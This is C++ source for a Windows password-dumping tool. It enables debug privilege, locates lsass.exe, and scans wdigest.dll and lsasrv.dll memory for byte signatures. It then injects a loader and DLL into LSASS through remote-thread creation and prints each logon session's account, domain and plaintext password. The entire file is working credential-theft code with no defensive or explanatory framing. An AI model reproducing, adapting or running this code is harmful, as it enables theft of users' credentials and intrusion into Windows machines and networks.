// getpwd.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <rtcapi.h>   
#include <dos.h>   
#include <stdio.h>   
#include <stdlib.h>   
#include <process.h>   
#include <mbctype.h>   

#define MAX_FILENM_BUF	0x400

#define NT_SUCCESS(x)	(((NTSTATUS)(x)) >= ERROR_SUCCESS)

BOOL m_bNoisy = TRUE;
int msg_print(const char *message, ...) {

#define MAX_OUTPUT_TEXT_SIZE 0x300

	va_list list; 
	va_start(list, message); 
	char szBuffer[MAX_OUTPUT_TEXT_SIZE]; 
	_vsnprintf_s(szBuffer, sizeof(szBuffer), message, list);

	szBuffer[MAX_OUTPUT_TEXT_SIZE - 1]= '\0';
	fprintf(stderr, "%s", szBuffer);

	va_end(list); 
	return 0;
}

BOOL IsPrintable(const char *pStr) {

	if (pStr) {
		for (size_t i = 0; i < strlen(pStr); ++i) {
			if (!isprint(pStr[i]))
				return FALSE;
		}

		return TRUE;
	}

	return FALSE;
}

DWORD FindWDIGEST_dll() {

	unsigned char digest1[] = "\x8B\xFF\x55\x8B\xEC\x56\xBE\x00\x56\xFF"
		"\x00\x00\x8B\x0D\x00\x00\x8B\x45\x08\x89\x08\xC7\x40\x04";

	DWORD v4 = 0; // [sp+8h] [bp-48h]@1
	int v9; // [sp+30h] [bp-20h]@1

	HMODULE hModule = LoadLibraryA("wdigest.dll");
	if (!hModule) {
		return 0;
	}

	MODULEINFO modinfo;
	if (!GetModuleInformation(GetCurrentProcess(), hModule, &modinfo, sizeof(MODULEINFO))) {
		return 0;
	}

	DWORD dwRet = 0;
	DWORD dwDllBase = (DWORD)modinfo.lpBaseOfDll;
	for (DWORD i = 0; i < 2; ++i) {

		int ucb = 7;
		BOOL bNext = FALSE;
		DWORD j = 0;

		for (j = 0; ; ++j) {

			if (j < modinfo.SizeOfImage) {

				if (IsBadReadPtr((const void *)(j + dwDllBase), 7)) {
					continue;
				}

				if (!memcmp((const void *)(j + dwDllBase), digest1, 7)) {
					bNext = TRUE;
				}

				if (!bNext) {
					continue;
				}

				bNext = FALSE;
				void *lp = (void *)(j + dwDllBase + 7 + 4);
				if (IsBadReadPtr((const void *)(j + dwDllBase + 7 + 4), 2)) {
					continue;
				}

				if (!memcmp(lp, digest1 + 8, 2)) {
					bNext = TRUE;
				}

				if (!bNext) continue;

				bNext = FALSE;
				lp = (char *)lp + 2 + 5;

				if (IsBadReadPtr(lp, 2u)) continue;
				if (!memcmp(lp, digest1 + 0xc, 2u)) {
					bNext = TRUE;
				}

				if (!bNext) continue;
				v4 = *(DWORD *)((char *)lp + 2);

				bNext = FALSE;
				lp = (char *)lp + 6;

				if (IsBadReadPtr(lp, 8u)) continue;

				if (!memcmp(lp, digest1 + 0x10, 8u)) bNext = TRUE;

				if (!bNext) continue;

				v9 = *((DWORD *)lp + 2);

				if (!bNext) continue;
			}

			break;
		}

		if (!bNext) {
			return 0;
		}
		else {
			dwDllBase += j + 110;
		}
	}

	dwRet = v4;
	return dwRet;
}

DWORD FindLSASRV_dll() {

	DWORD dwRet = 0; // eax@  

	unsigned char sig1[] = "\x8B\xFF\x55\x8B\xEC\x6A\x00\xFF\x75\x0C\xFF\x75\x08\xE8\x00\x00\x5D\xC2\x08\x00\x00\x00\x00\x00";
	unsigned char sig2[] = "\xE8\x00\x00\x5D\xC2\x08\x00\x00\x00\x00\x00";

	HMODULE hModule = LoadLibraryA("lsasrv.dll");
	if (!hModule) {
		return 0;
	}

	MODULEINFO modinfo;
	if (!GetModuleInformation(GetCurrentProcess(), hModule, &modinfo, sizeof(MODULEINFO))) {
		return 0;
	}

	DWORD dwDllBase = (DWORD)modinfo.lpBaseOfDll;
	BOOL bFind1st = FALSE, bFind2rd = FALSE;
	DWORD i = 0;

	for (i = 0; i < modinfo.SizeOfImage; ++i){

		if (!memcmp((const void *)(i + dwDllBase), sig1, 14)) {
			bFind1st = TRUE;
			break;
		}
	}

	if (bFind1st) {
		bFind2rd = FALSE;
		if (!memcmp((const void *)(i + dwDllBase + 14 + 4), sig2 + 3, 4))
			bFind2rd = TRUE;

		if (bFind2rd == 1) {
			dwRet = i + dwDllBase;
		}
	}

	return dwRet;
}

DWORD FindWDIGEST_dll_2() {

	unsigned char digest2[] = "\x8B\xFF\x55\x8B\xEC\x56\xBE\x00"
	"\x56\xFF\x00\x00\x8B\x0D\x00\x00\x8B\x45\x08\x89\x08\xC7\x40\x04";

	HMODULE hModule = LoadLibraryA("wdigest.dll");
	if (!hModule) {
		return 0;
	}

	MODULEINFO modinfo;
	if (!GetModuleInformation(GetCurrentProcess(), hModule, &modinfo, sizeof(MODULEINFO))) {
		return 0;
	}

	DWORD dwRet = 0, dwResult = 0;
	DWORD dwDllBase = (DWORD)modinfo.lpBaseOfDll;

	BOOL bNext = FALSE;
	for (DWORD i = 0; ; ++i) {
		if (i < modinfo.SizeOfImage) {

			if (IsBadReadPtr((const void *)(i + dwDllBase), 7)) continue;

			if (!memcmp((const void *)(i + dwDllBase), digest2, 7)) {
				bNext = TRUE;
			}

			if (!bNext) continue;
			bNext = FALSE;

			void *lp = (void *)(i + dwDllBase + 7 + 4);
			if (IsBadReadPtr((const void *)(i + dwDllBase + 7 + 4), 2) ) continue;
			if (!memcmp(lp, digest2 + 8, 2) )
				bNext = TRUE;

			if (!bNext) continue;
			bNext = FALSE;

			lp = (char *)lp + 2 + 5;
			if (IsBadReadPtr(lp, 2u)) continue;
			if (!memcmp(lp, digest2 + 0xc, 2u))
				bNext = TRUE;

			if (!bNext) continue;
			bNext = FALSE;

			dwResult = *(_DWORD *)((char *)lp + 2);
			lp = (char *)lp + 6;

			if (IsBadReadPtr(lp, 8u)) continue;
			if (!memcmp(lp, digest2 + 0x10, 8u)) {
				bNext = TRUE;
			}

			if (!bNext) continue;

			DWORD v7 = *((_DWORD *)lp + 2);

			if (!bNext) continue;
		}

		break;
	}

	if (bNext) dwRet = dwResult;
	return dwRet;
}

struct CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
};

typedef enum _KWAIT_REASON {
	Executive,
	FreePage
} KWAIT_REASON;

typedef LONG KPRIORITY;

typedef struct _SYSTEM_THREADS {    
	LARGE_INTEGER KernelTime;    
	LARGE_INTEGER UserTime;    
	LARGE_INTEGER CreateTime;    
	ULONG WaitTime;    
	PVOID StartAddress;    
	CLIENT_ID ClientId;    
	KPRIORITY Priority;    
	KPRIORITY BasePriority;    
	ULONG ContextSwitchCount;    
	ULONG ThreadState;    
	KWAIT_REASON WaitReason;    
}SYSTEM_THREADS,*PSYSTEM_THREADS;   

typedef struct _VM_COUNTERS {
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
} VM_COUNTERS;
typedef VM_COUNTERS *PVM_COUNTERS;

typedef struct _SYSTEM_PROCESSES {    
	ULONG NextEntryDelta;
	ULONG ThreadCount;    
	ULONG Reserved[6];    
	LARGE_INTEGER CreateTime;    
	LARGE_INTEGER UserTime;    
	LARGE_INTEGER KernelTime;    
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;    
	ULONG ProcessId;
	ULONG InheritedFromProcessId;    
	ULONG HandleCount;    
	ULONG Reserved2[2];    
	VM_COUNTERS VmCounters;    
	IO_COUNTERS IoCounters; //windows 2000 only    
	struct _SYSTEM_THREADS Threads[1];    
}SYSTEM_PROCESSES,*PSYSTEM_PROCESSES;  

DWORD GetProcessIdByName(const wchar_t * pszProcessName) {

	DWORD nRet = 0;

#define UsingNTApi(x)   pfn_##x x = NULL; {\
	x = (pfn_##x)::GetProcAddress(::GetModuleHandleA( \
	"ntdll.dll"), #x); \
	if (NULL == x) { \
	::RaiseException( \
	EXCEPTION_ACCESS_VIOLATION, \
	EXCEPTION_NONCONTINUABLE, \
	0, \
	NULL); \
	} \
	}

	typedef NTSTATUS (NTAPI *pfn_ZwQuerySystemInformation)(
		IN ULONG SystemInformationClass,
		OUT PVOID SystemInformation,  
		IN ULONG SystemInformationLength,  
		OUT PULONG ReturnLength  
		);


	UsingNTApi(ZwQuerySystemInformation);
	if (!ZwQuerySystemInformation) return nRet;

	ULONG cbNeeded = 0;
	ZwQuerySystemInformation(5, NULL, 0, &cbNeeded);

	if (cbNeeded < 1) return nRet;

	PVOID pProcEs = (PVOID)malloc(cbNeeded + 2);
	if (!pProcEs) return nRet;

	if (!(NT_SUCCESS(ZwQuerySystemInformation(
		5, pProcEs, cbNeeded, NULL)))) {
			free(pProcEs);
			return nRet;
	}

	PSYSTEM_PROCESSES pProc = (PSYSTEM_PROCESSES)pProcEs;	
	do {
		pProc = (PSYSTEM_PROCESSES)((char *)pProc + pProc->NextEntryDelta);
		if (wcsncmp(pProc->ProcessName.Buffer, 
			pszProcessName, wcslen(pszProcessName))) continue;

		nRet = pProc->ProcessId;
		break;

	} while (pProc->NextEntryDelta != 0);

	free(pProcEs);
	return nRet;
}

HANDLE NtCreateThreadEx_1(HANDLE hRemoteProc, LPTHREAD_START_ROUTINE pfnThread, LPVOID pThreadData) {

	typedef struct _THREADEX_ID{
	 DWORD ProcessId;
	 DWORD ThreadId;
	} THREADEX_ID, *PTHREADEX_ID;

	typedef struct {
	ULONG Size;
	ULONG Unknown1;
	ULONG Unknown2;
	PTHREADEX_ID pThreadexId;
	ULONG Unknown4;
	ULONG Unknown5;
	ULONG Unknown6;
	PVOID *pPTEB;
	ULONG Unknown8;
	} NtCreateThreadExBuffer;

	typedef NTSTATUS (WINAPI *LPFUN_NtCreateThreadEx) (
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN LPVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN LPTHREAD_START_ROUTINE lpStartAddress,
    IN LPVOID lpParameter,
    IN BOOL CreateSuspended,
    IN ULONG StackZeroBits,
    IN ULONG SizeOfStackCommit,
    IN ULONG SizeOfStackReserve,
    OUT LPVOID lpBytesBuffer
	);

	HANDLE hRet = INVALID_HANDLE_VALUE; // eax@2

	HMODULE hModule = GetModuleHandleA("ntdll.dll");
	if (hModule) {

		LPFUN_NtCreateThreadEx pNtCreateThreadEx = 
			(LPFUN_NtCreateThreadEx)GetProcAddress(hModule, "NtCreateThreadEx");
		if (pNtCreateThreadEx) {

			NtCreateThreadExBuffer buf;
			memset (&buf,0,sizeof(NtCreateThreadExBuffer));

			PVOID pTEB = 0;
			THREADEX_ID ThreadExId = {0};

			buf.Size = sizeof(NtCreateThreadExBuffer);
			buf.Unknown1 = 0x10003;
			buf.Unknown2 = 0x8;
			buf.pThreadexId = &ThreadExId;
			buf.Unknown4 = 0;
			buf.Unknown5 = 0x10004;
			buf.Unknown6 = 4;
			buf.pPTEB = &pTEB;
			buf.Unknown8 = 0;

			HANDLE hRemoteThread = INVALID_HANDLE_VALUE;
			pNtCreateThreadEx(
				&hRemoteThread, 0x1FFFFF, NULL, hRemoteProc, pfnThread, pThreadData, 
				FALSE, NULL, NULL, NULL, &buf);

			if (hRemoteThread && (hRemoteThread != INVALID_HANDLE_VALUE)) {
				hRet = hRemoteThread;
			}
			else {
				msg_print("CrossSessionCreateRemoteThread: Cannot create new thread\n");
			}
		}
		else {
			msg_print("CrossSessionCreateRemoteThread: cannot get function address\n");
		}
	}
	else {
		msg_print("CrossSessionCreateRemoteThread: Cannot get ntdll.dll base address\n");
	}

	return hRet;
}

__declspec(noinline) int __cdecl pfnRemoteFunc(CREATE_THREAD_PARAM_T *param) {

	int nRet = 0;

	HMODULE hModule = param->LoadLibraryA(param->DllFileName);
	if (hModule) {
		
		pfn_LookupAccount LookupAccount =
			(pfn_LookupAccount)param->GetProcAddress(hModule, param->FuncName);

		if (LookupAccount) {
			nRet = (int)LookupAccount(param->param);
		}

		param->FreeLibrary(hModule);
	}

	return nRet;
}

__declspec(noinline) void __cdecl pfnEndofRemoteFunc() {

}

HANDLE my_CreateRemoteThread(HANDLE hRemoteProc, LPTHREAD_START_ROUTINE pThreadFun, LPVOID pThreadData) {

	/*
	win vista/7 NtCreateThreadEx
	win xp/8 CreateRemoteThread
	*/

	BOOL bCrossSession = FALSE;

	OSVERSIONINFOA sysVersion;
	sysVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);

	if (GetVersionExA(&sysVersion)) {
		if ((sysVersion.dwMajorVersion >= 6) && (sysVersion.dwMinorVersion != 2)) {
			bCrossSession = TRUE;
		}
	}

	HANDLE hThread = NULL;

	if (bCrossSession) {
		hThread = NtCreateThreadEx_1(hRemoteProc, pThreadFun, pThreadData);
	} else {
		DWORD dwThreadId = 0;
		hThread = CreateRemoteThread(hRemoteProc, NULL, 0, pThreadFun, pThreadData, 0, &dwThreadId);
	}

	return hThread;
}

BOOL GetUserPassword(DWORD dwProcessId, const char *pDllFileName, INPUT_PARAM_T *param) {

	BOOL bRet = FALSE;

	if (!dwProcessId || !pDllFileName || !param) {
		msg_print("Parameters wrong\n");
		return FALSE;
	}

	char *pFuncName = (char *)param;
	if (!param->pParam || !param->paramSize) {
		return FALSE;
	}

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcessId);
	if (hProcess == INVALID_HANDLE_VALUE) {
		msg_print("Cannot open process with PID %d (%xh)\n", dwProcessId, dwProcessId);
		return FALSE;
	}

	HMODULE hModule = GetModuleHandleA("kernel32.dll");

	CREATE_THREAD_PARAM_T ctpt;

	ctpt.LoadLibraryA = (pfn_LoadLibraryA)GetProcAddress(hModule, "LoadLibraryA");
	ctpt.GetProcAddress = (pfn_GetProcAddress)GetProcAddress(hModule, "GetProcAddress");
	ctpt.FreeLibrary = (pfn_FreeLibrary)GetProcAddress(hModule, "FreeLibrary");

	strncpy(ctpt.DllFileName, pDllFileName, MAX_FILENM_BUF - 1);
	strncpy(ctpt.FuncName, param->FuncName, MAX_FILENM_BUF - 1);

	LPVOID lpRemoteParamAddr = NULL;
	LPVOID lpRemoteFuncAddr = NULL;
	LPTHREAD_START_ROUTINE pThreadFun = NULL;
	HANDLE hThread = NULL;
	SIZE_T dwSize = param->paramSize + 10;
	SIZE_T dwNumBytes = 0;
	SIZE_T nSize = (char *)pfnEndofRemoteFunc - (char *)pfnRemoteFunc;
	SIZE_T nTotalSize = nSize + 0x818;

	lpRemoteParamAddr = VirtualAllocEx(hProcess, 0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteParamAddr) { 

		msg_print("Cannot allocate RWX memory in remote process\n");
		goto Exit0;
	}

	ctpt.param = (REMOTE_PARAM_T *)lpRemoteParamAddr;
	ctpt.paramSize = param->paramSize;

	if (!WriteProcessMemory(hProcess, lpRemoteParamAddr, param->pParam, param->paramSize, &dwNumBytes)
		|| (dwNumBytes != param->paramSize)) {

			msg_print("Cannot write data to remote process\n");
			goto Exit0;
	}

	lpRemoteFuncAddr = VirtualAllocEx(hProcess, 0, nTotalSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteFuncAddr) {
		msg_print("Cannot allocate loader in remote process!\n");
		goto Exit0;
	}

	if (!WriteProcessMemory(hProcess, lpRemoteFuncAddr, &ctpt, sizeof(CREATE_THREAD_PARAM_T), &dwNumBytes)
		|| (dwNumBytes != sizeof(CREATE_THREAD_PARAM_T))) {

			msg_print("Cannot write loader params to remote process!\n");
			goto Exit0;
	}

	if (!WriteProcessMemory(hProcess, (char *)lpRemoteFuncAddr + 0x818, pfnRemoteFunc, nSize, &dwNumBytes)
		|| (dwNumBytes != nSize)) {

			msg_print("Cannot write loader to remote process!\n");
			goto Exit0;
	}

	pThreadFun = (LPTHREAD_START_ROUTINE)((char *)lpRemoteFuncAddr + 0x818);
	hThread = my_CreateRemoteThread(hProcess, pThreadFun, lpRemoteFuncAddr);
	if (hThread && (hThread != INVALID_HANDLE_VALUE)) {

		WaitForSingleObject(hThread, INFINITE);

		if (!ReadProcessMemory(hProcess, lpRemoteParamAddr, param->pParam, param->paramSize, &dwNumBytes)
			|| (dwNumBytes != param->paramSize)) {

			msg_print("Cannot read result from loader!.\n");
		}
		else {
			bRet = TRUE;
		}

		CloseHandle(hThread);
	}
	else {
		msg_print("Cannot run code in remote process! (mode:%d)\n");
	}

Exit0:

	if (lpRemoteFuncAddr) {
		VirtualFreeEx(hProcess, lpRemoteFuncAddr, 0, 0x8000u);
	}

	if (lpRemoteParamAddr) {
		VirtualFreeEx(hProcess, lpRemoteParamAddr, 0, 0x8000u);
	}

	if (hProcess) {
		CloseHandle(hProcess);
	}

	return bRet;
}

int LookupAccountPwd() {

	int nRet = -1;

	if (m_bNoisy) {
		msg_print("Reading by injecting code! (less-safe mode)\n");
	}

	DWORD dwLSASRV_dll = FindLSASRV_dll(), dwWDIGEST_dll = 0;

	OSVERSIONINFOA sysVersion;
	sysVersion.dwOSVersionInfoSize = sizeof(sysVersion);
	GetVersionExA(&sysVersion);

	if ((sysVersion.dwMajorVersion < 6) && (
		(sysVersion.dwMajorVersion != 5) || (sysVersion.dwMinorVersion != 2))) {
			dwWDIGEST_dll = FindWDIGEST_dll();
	}
	else {
		dwWDIGEST_dll = FindWDIGEST_dll_2();
	}

	if (!dwLSASRV_dll || !dwWDIGEST_dll) {
		msg_print("ERROR: Cannot find dependencies\n");
		return nRet;
	}

	DWORD dwProcessId = GetProcessIdByName(L"lsass.exe");
	if (!dwProcessId) {
		msg_print("Cannot get PID of LSASS.EXE!\n");
		exit(0);
	}

	HANDLE hLSASS = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcessId);
	if (hLSASS == INVALID_HANDLE_VALUE) {
		msg_print("Error: Cannot open LSASS.EXE!.\n");
		exit(0);
	}

	ULONG nLogonSessionCount = 0;
	PLUID pLogonSessionList = NULL; 
	NTSTATUS status = LsaEnumerateLogonSessions(&nLogonSessionCount, &pLogonSessionList);
	if (!NT_SUCCESS(status)) {
		msg_print("Can't enumerate logon sessions!\n");
		exit(0);
	}

	if (m_bNoisy) {
		msg_print("Logon Sessions Found: %d\n", nLogonSessionCount);
	}

	REMOTE_PARAM_T *remp = (REMOTE_PARAM_T *)malloc(sizeof(REMOTE_PARAM_T));
	if (!remp) {
		msg_print("Cannot alloc wcewdparams!.");
		exit(0);
	}

	INPUT_PARAM_T inpt;
	strcpy(inpt.FuncName, "_0212DBDHJKSAHD0183923kljmLKL");
	inpt.pParam = remp;
	inpt.paramSize = sizeof(REMOTE_PARAM_T);

	char szInjectDll[1024] = {0};	
	::GetCurrentDirectoryA(1022, szInjectDll);
	::PathAppendA(szInjectDll, "getpwd_dll.dll");

	for (ULONG i = 0; i < nLogonSessionCount; ++i) {

		memset(remp, 0, sizeof(REMOTE_PARAM_T));

		remp->dwDecryptAddr = dwLSASRV_dll;
		remp->dwLogonSessionEntry = dwWDIGEST_dll;

		remp->Retn = 0;
		remp->LogonId.LowPart = pLogonSessionList[i].LowPart;
		remp->LogonId.HighPart = pLogonSessionList[i].HighPart;

		if (GetUserPassword(dwProcessId, szInjectDll, &inpt)) {

			if (remp->Retn == 1) {

				msg_print("ID: %d\nAccout: %s\nDomain: %s\nPassword: ",
					remp->SessionId, remp->szAccount, remp->szDomain);

				if (IsPrintable((const char *)remp->szPassword)) {
					msg_print("%s\n", remp->szPassword);
				}
				else {
					msg_print("<contains-non-printable-chars>");
				}			
			}
		}
		else {
			msg_print("Error in InjectDllAndCallFunction\n");
		}
	}

	free(remp);

	LsaFreeReturnBuffer(pLogonSessionList);
	return 0;
}

int EnableDebugPrivilege2() {

	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
		msg_print("OpenProcessToken fail");
		return 0 ;
	}

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {
		msg_print("LookupPrivilegeValue fail");
		return 0 ;
	}

	tkp.PrivilegeCount = 1 ;
	tkp.Privileges[0].Luid = sedebugnameValue ;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED ;

	if(!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		msg_print("AdjustTokenPrivileges fail");
		return 0 ;
	}

	return 1 ;
}

int main(int argc, char* argv[]) {

	EnableDebugPrivilege2();
	LookupAccountPwd();

	exit(0);
	return 0;
}

